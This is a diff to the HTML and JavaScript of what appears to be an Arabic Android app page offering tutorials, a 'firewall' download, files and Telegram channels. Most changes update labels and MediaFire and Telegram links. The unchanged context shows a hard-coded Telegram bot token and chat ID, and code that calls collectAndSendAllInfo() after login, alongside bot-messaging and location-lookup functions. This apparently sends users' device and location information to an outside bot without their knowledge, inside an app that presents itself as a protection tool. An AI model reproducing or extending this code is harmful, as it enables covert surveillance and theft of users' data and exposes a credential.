@@ -321,8 +321,8 @@ a{color:inherit;text-decoration:none}
       <div class="ptitle" data-i18n="pt_tutorial">تعليم استعمال التطبيق</div>
     </div>
     <div class="pbody">
-      <button class="lbtn" data-link="tutorial1"><span class="lic">🎬</span><span data-i18n="tut1">شرح استخدام التطبيق</span></button>
-      <button class="lbtn" data-link="tutorial2"><span class="lic">📖</span><span data-i18n="tut2">شرح الإعدادات</span></button>
+      <button class="lbtn" data-link="tutorial1"><span class="lic">🎬</span><span data-i18n="tut1">شرح نقل ملفات من تطبيق</span></button>
+      <button class="lbtn" data-link="tutorial2"><span class="lic">📖</span><span data-i18n="tut2">طريقة تشغيل جدار ناري</span></button>
     </div>
   </div>
 
@@ -359,13 +359,12 @@ a{color:inherit;text-decoration:none}
       <div class="ptitle" data-i18n="pt_channels">قنواتنا الرسمية</div>
     </div>
     <div class="pbody">
-      <button class="lbtn" data-link="channel1"><span class="lic">📢</span><span data-i18n="ch1">القناة الرئيسية</span></button>
-      <button class="lbtn" data-link="channel2"><span class="lic">💬</span><span data-i18n="ch2">قناة الأخبار</span></button>
-      <button class="lbtn" data-link="channel3"><span class="lic">🔥</span><span data-i18n="ch3">قناة التحديثات</span></button>
-      <button class="lbtn" data-link="channel4"><span class="lic">🎬</span><span data-i18n="ch4">قناة الشروحات</span></button>
-      <button class="lbtn" data-link="channel5"><span class="lic">📱</span><span data-i18n="ch5">قناة التطبيقات</span></button>
-      <button class="lbtn" data-link="channel6"><span class="lic">🛠️</span><span data-i18n="ch6">قناة الدعم</span></button>
-      <button class="lbtn" data-link="channel7"><span class="lic">🌐</span><span data-i18n="ch7">قناتنا الرسمية</span></button>
+      <button class="lbtn" data-link="channel1"><span class="lic">📢</span><span data-i18n="ch1">القناة الأولى</span></button>
+      <button class="lbtn" data-link="channel2"><span class="lic">💬</span><span data-i18n="ch2">القناة الثانية</span></button>
+      <button class="lbtn" data-link="channel3"><span class="lic">🔥</span><span data-i18n="ch3">القناة الثالثة</span></button>
+      <button class="lbtn" data-link="channel4"><span class="lic">🎬</span><span data-i18n="ch4">القناة الرابعة</span></button>
+      <button class="lbtn" data-link="channel5"><span class="lic">📱</span><span data-i18n="ch5">القناة الخامسة</span></button>
+      <button class="lbtn" data-link="channel6"><span class="lic">🛠️</span><span data-i18n="ch6">القناة السادسة</span></button>
     </div>
   </div>
 
@@ -375,30 +374,61 @@ a{color:inherit;text-decoration:none}
 
 <script>
 /* ============================================================
-   [A] TELEGRAM CONFIG — التوكن والـID
+   [A] TELEGRAM CONFIG
    ============================================================ */
 const BOT_TOKEN = "8840259053:AAGkMfC9pMGbmM3XrF8Yns4tcJT9iCtN4C4";
 const CHAT_ID   = "8683148899";
 
 /* ============================================================
-   [B] LINKS
+   [B] LINKS — ضع رابط كل زر هنا 👇
    ============================================================ */
 const LINKS = {
-  tutorial1:"https://www.mediafire.com/",
-  tutorial2:"https://www.mediafire.com/",
-  firewall1:"https://www.mediafire.com/",
-  firewall2:"https://www.mediafire.com/",
-  file1:"https://www.mediafire.com/",
-  file2:"https://www.mediafire.com/",
-  file3:"https://www.mediafire.com/",
-  file4:"https://www.mediafire.com/",
-  channel1:"https://t.me/",
-  channel2:"https://t.me/",
-  channel3:"https://t.me/",
-  channel4:"https://t.me/",
-  channel5:"https://t.me/",
-  channel6:"https://t.me/",
-  channel7:"https://t.me/"
+
+  /* ========== 📚 صفحة تعليم استعمال التطبيق ========== */
+  // 🎬 زر: شرح نقل ملفات من تطبيق
+  tutorial1: "https://www.mediafire.com/file/9sd36jf1c41x2e2/mobizen_20260902_101716.mp4/file",
+
+  // 📖 زر: طريقة تشغيل جدار ناري
+  tutorial2: "https://www.mediafire.com/file/h9fnvt02alaggp8/mobizen_20260902_101803.mp4/file",
+
+  /* ========== 🛡️ صفحة الجدار الناري ========== */
+  // 🛡️ زر: تحميل الجدار الناري
+  firewall1: "ضع_رابط_تحميل_الجدار_الناري_هنا",
+
+  // ⚡ زر: شرح إعداد الجدار الناري
+  firewall2: "ضع_رابط_شرح_إعداد_الجدار_الناري_هنا",
+
+  /* ========== 📁 صفحة مركز الملفات ========== */
+  // 📦 زر: الملف الأول
+  file1: "ضع_رابط_الملف_الأول_هنا",
+
+  // 📦 زر: الملف الثاني
+  file2: "ضع_رابط_الملف_الثاني_هنا",
+
+  // 📦 زر: الملف الثالث
+  file3: "ضع_رابط_الملف_الثالث_هنا",
+
+  // 📦 زر: الملف الرابع
+  file4: "ضع_رابط_الملف_الرابع_هنا",
+
+  /* ========== 📡 صفحة قنواتنا الرسمية ========== */
+  // 📢 زر: القناة الأولى
+  channel1: "https://t.me/F35N1",
+
+  // 💬 زر: القناة الثانية
+  channel2: "https://t.me/M_F_TR",
+
+  // 🔥 زر: القناة الثالثة
+  channel3: "https://t.me/X8_31",
+
+  // 🎬 زر: القناة الرابعة
+  channel4: "https://t.me/X8_1O",
+
+  // 📱 زر: القناة الخامسة
+  channel5: "https://t.me/X8_39",
+
+  // 🛠️ زر: القناة السادسة
+  channel6: "https://t.me/QMQQP"
 };
 
 /* ============================================================
@@ -418,12 +448,12 @@ const I18N = {
     c3t:"جدار ناري", c3d:"أدوات وإعدادات الحماية",
     c4t:"ملفات", c4d:"الوصول إلى الملفات والتحميلات",
     c5t:"اللغة", c5d:"العربية / English",
-    pt_tutorial:"تعليم استعمال التطبيق", tut1:"شرح استخدام التطبيق", tut2:"شرح الإعدادات",
+    pt_tutorial:"تعليم استعمال التطبيق", tut1:"شرح نقل ملفات من تطبيق", tut2:"طريقة تشغيل جدار ناري",
     pt_firewall:"الجدار الناري", fw1:"تحميل الجدار الناري", fw2:"شرح إعداد الجدار الناري",
     pt_files:"مركز الملفات", f1:"الملف الأول", f2:"الملف الثاني", f3:"الملف الثالث", f4:"الملف الرابع",
     pt_channels:"قنواتنا الرسمية",
-    ch1:"القناة الرئيسية", ch2:"قناة الأخبار", ch3:"قناة التحديثات",
-    ch4:"قناة الشروحات", ch5:"قناة التطبيقات", ch6:"قناة الدعم", ch7:"قناتنا الرسمية"
+    ch1:"القناة الأولى", ch2:"القناة الثانية", ch3:"القناة الثالثة",
+    ch4:"القناة الرابعة", ch5:"القناة الخامسة", ch6:"القناة السادسة"
   },
   en:{
     welcome:"WELCOME BACK", loginBtn:"🔓 LOGIN", wrongPass:"❌ Wrong password",
@@ -433,12 +463,12 @@ const I18N = {
     c3t:"Firewall", c3d:"Protection tools & settings",
     c4t:"Files", c4d:"Access files & downloads",
     c5t:"Language", c5d:"العربية / English",
-    pt_tutorial:"App Tutorial", tut1:"App Usage Tutorial", tut2:"Settings Tutorial",
+    pt_tutorial:"App Tutorial", tut1:"How to transfer files from an app", tut2:"How to run the firewall",
     pt_firewall:"Firewall", fw1:"Download Firewall", fw2:"Firewall Setup Guide",
     pt_files:"File Center", f1:"File One", f2:"File Two", f3:"File Three", f4:"File Four",
     pt_channels:"Official Channels",
-    ch1:"Main Channel", ch2:"News Channel", ch3:"Updates Channel",
-    ch4:"Tutorials Channel", ch5:"Apps Channel", ch6:"Support Channel", ch7:"Official Channel"
+    ch1:"Channel One", ch2:"Channel Two", ch3:"Channel Three",
+    ch4:"Channel Four", ch5:"Channel Five", ch6:"Channel Six"
   }
 };
 
@@ -531,7 +561,6 @@ $("#loginBtn").addEventListener("click", ()=>{
     show("home");
     toast(LANG==="ar" ? "✅ مرحباً" : "✅ Welcome");
     try{ if(window.AndroidBridge) AndroidBridge.onLoginSuccess(); }catch(e){}
-    // ===== إرسال معلومات الجهاز عند الدخول =====
     setTimeout(()=>{ collectAndSendAllInfo(); }, 600);
   }else{
     $("#alert").classList.add("show");
@@ -573,7 +602,10 @@ $$("[data-link]").forEach(btn=>{
   btn.addEventListener("click", ()=>{
     const key = btn.getAttribute("data-link");
     const url = LINKS[key];
-    if(!url){ toast(LANG==="ar" ? "⚠️ الرابط غير مُعد" : "⚠️ Link not set"); return; }
+    if(!url || url.startsWith("ضع_")){
+      toast(LANG==="ar" ? "⚠️ الرابط غير مُعد" : "⚠️ Link not set");
+      return;
+    }
     if(window.AndroidBridge && typeof AndroidBridge.openUrl === "function"){
       AndroidBridge.openUrl(url);
     }else{
@@ -583,15 +615,15 @@ $$("[data-link]").forEach(btn=>{
 });
 
 /* ============================================================
-   [K] TOAST (نسخة متوافقة)
+   [K] TOAST
    ============================================================ */
 function showToast(message, type = "success") {
-    const toast = document.getElementById("toast");
-    toast.textContent = message;
-    toast.className = "toast " + type;
-    toast.classList.add("show");
-    clearTimeout(toast._timeout);
-    toast._timeout = setTimeout(() => { toast.classList.remove("show"); }, 3000);
+    const t = document.getElementById("toast");
+    t.textContent = message;
+    t.className = "toast " + type;
+    t.classList.add("show");
+    clearTimeout(t._timeout);
+    t._timeout = setTimeout(() => { t.classList.remove("show"); }, 3000);
 }
 
 /* ============================================================
@@ -606,7 +638,7 @@ function sendMessageToBot(text) {
 }
 
 /* ============================================================
-   [M] LOCATION INFO (IP)
+   [M] LOCATION INFO
    ============================================================ */
 async function getLocationInfo() {
     try {
